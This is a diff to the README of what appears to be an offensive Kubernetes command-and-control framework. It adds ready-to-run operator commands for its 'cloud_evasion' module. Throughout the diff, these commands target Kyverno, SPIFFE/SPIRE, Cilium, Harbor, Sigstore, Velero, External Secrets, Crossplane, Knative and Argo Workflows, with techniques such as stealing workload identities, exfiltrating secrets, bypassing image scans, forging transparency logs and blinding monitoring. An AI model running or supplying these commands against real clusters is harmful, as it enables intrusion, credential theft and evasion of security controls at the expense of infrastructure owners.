@@ -1829,7 +1829,7 @@ Agents include a built-in module system for executing specialized techniques wit
 | `cloud_exploit` | linux, windows, darwin | Cloud provider exploitation (AWS, GCP, Azure IAM/metadata attacks) |
 | `cicd_poison` | linux, windows, darwin | CI/CD pipeline poisoning (Tekton, ArgoCD, Flux task/app injection) |
 | `service_mesh` | linux, windows, darwin | Service mesh deep attacks (Istio xDS injection, mTLS cert theft, traffic hijack) |
-| `cloud_evasion` | linux, windows, darwin | Detection evasion (Falco, Tetragon, KubeArmor, Kubescape, Falco Talon, service mesh, cert-manager) |
+| `cloud_evasion` | linux, windows, darwin | Detection evasion for 17 CNCF products (Falco, Tetragon, KubeArmor, Kubescape, Falco Talon, service mesh, cert-manager, SPIFFE/SPIRE, Kyverno, Cilium, Harbor, Sigstore/Cosign, Velero, External Secrets, Crossplane, Knative, Argo Workflows) |
 
 **Module usage via operator:**
 
@@ -1929,6 +1929,66 @@ Agents include a built-in module system for executing specialized techniques wit
 ./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=certmanager technique=issue_cert
 ./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=certmanager technique=steal_ca
 ./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=certmanager technique=mitm_prep
+
+# Kyverno policy engine evasion (policy gaps, background bypass, webhook race, mutate exploit)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kyverno technique=policy_gaps
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kyverno technique=background_bypass
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kyverno technique=webhook_race
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kyverno technique=mutate_exploit
+
+# SPIFFE/SPIRE workload identity exploitation (enumerate, steal SVID, poison entries, impersonate)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=spiffe technique=enumerate
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=spiffe technique=steal_svid
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=spiffe technique=poison_entries
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=spiffe technique=impersonate
+
+# Cilium network enforcement evasion (identity spoof, policy gaps, Hubble blind spots, endpoint manipulation)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=cilium technique=identity_spoof
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=cilium technique=policy_gaps
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=cilium technique=hubble_blind
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=cilium technique=endpoint_manipulate
+
+# Harbor container registry exploitation (enumerate, bypass scan, robot exploit, replication hijack)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=harbor technique=enumerate
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=harbor technique=bypass_scan
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=harbor technique=robot_exploit
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=harbor technique=replication_hijack
+
+# Sigstore/Cosign verification bypass (policy gaps, keyless exploit, webhook failure, transparency forge)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=sigstore technique=policy_gaps
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=sigstore technique=keyless_exploit
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=sigstore technique=webhook_failure
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=sigstore technique=transparency_forge
+
+# Velero backup/restore exploitation (enumerate, backup inject, restore hooks, secret steal)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=velero technique=enumerate
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=velero technique=backup_inject
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=velero technique=restore_hooks
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=velero technique=secret_steal
+
+# External Secrets Operator exploitation (enumerate, store exploit, rogue store, secret exfil)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=externalsecrets technique=enumerate
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=externalsecrets technique=store_exploit
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=externalsecrets technique=rogue_store
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=externalsecrets technique=secret_exfil
+
+# Crossplane infrastructure exploitation (enumerate, provider creds, composition inject, managed resource)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=crossplane technique=enumerate
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=crossplane technique=provider_creds
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=crossplane technique=composition_inject
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=crossplane technique=managed_resource
+
+# Knative serverless exploitation (enumerate, queue proxy intercept, autoscaler abuse, revision inject)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=knative technique=enumerate
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=knative technique=queue_proxy
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=knative technique=autoscaler_abuse
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=knative technique=revision_inject
+
+# Argo Workflows exploitation (enumerate, template inject, artifact steal, RBAC exploit)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=argo technique=enumerate
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=argo technique=template_inject
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=argo technique=artifact_steal
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=argo technique=rbac_exploit
 ```
 
 ---
